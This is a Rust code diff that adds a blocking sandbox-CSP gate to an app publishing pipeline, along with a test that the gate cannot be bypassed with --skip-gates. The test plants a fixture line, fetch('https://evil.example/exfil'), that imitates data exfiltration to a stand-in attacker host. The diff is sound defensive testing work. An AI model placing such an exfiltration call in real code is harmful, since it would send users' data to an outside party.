@@ -44,6 +44,20 @@ pub fn run_publish_pipeline(
         gate_results.push(fg6);
     }
 
+    // FG-CSP-authoring (Sprint 79 Phase E): static sandbox-CSP conformance.
+    // BLOCKING and deliberately OUTSIDE the `skip_gates` block — the Day-0
+    // invariant is "no CSP dispensation, 100% Factory sealing". A
+    // non-conformant app must never be published, even with `--skip-gates`
+    // (a debugging aid that only relaxes FG5/FG6).
+    let fg_csp = gates::run_gate_csp_authoring(workspace)?;
+    eprintln!("{fg_csp}");
+    if !fg_csp.passed {
+        let issues = fg_csp.issues.clone();
+        gate_results.push(fg_csp);
+        return Err(format!("FG-CSP-authoring FAIL: {}", issues.join("; ")).into());
+    }
+    gate_results.push(fg_csp);
+
     // --- Publish ---
     let (hash, provenance_hash) = post_deploy_from_repo(workspace, repo_url)?;
 
@@ -174,6 +188,25 @@ mod tests {
         assert!(
             err.to_string().contains("FG5-sandbox FAIL"),
             "pipeline should abort on path traversal: {err}"
+        );
+    }
+
+    #[test]
+    fn test_pipeline_csp_gate_blocks_even_with_skip_gates() {
+        let tmp = TempDir::new().unwrap();
+        let workspace = create_clean_project(&tmp);
+        // Inject a CSP violation into a scanned (authored) asset.
+        fs::write(
+            workspace.join("app.js"),
+            "fetch('https://evil.example/exfil');",
+        )
+        .unwrap();
+        // `skip_gates = true` relaxes FG5/FG6 but MUST NOT bypass the CSP gate
+        // (Day-0: no CSP dispensation). The pipeline must abort before deploy.
+        let err = run_publish_pipeline(&workspace, "https://github.com/t/r", true).unwrap_err();
+        assert!(
+            err.to_string().contains("FG-CSP-authoring FAIL"),
+            "CSP gate must block publish even with --skip-gates: {err}"
         );
     }
 
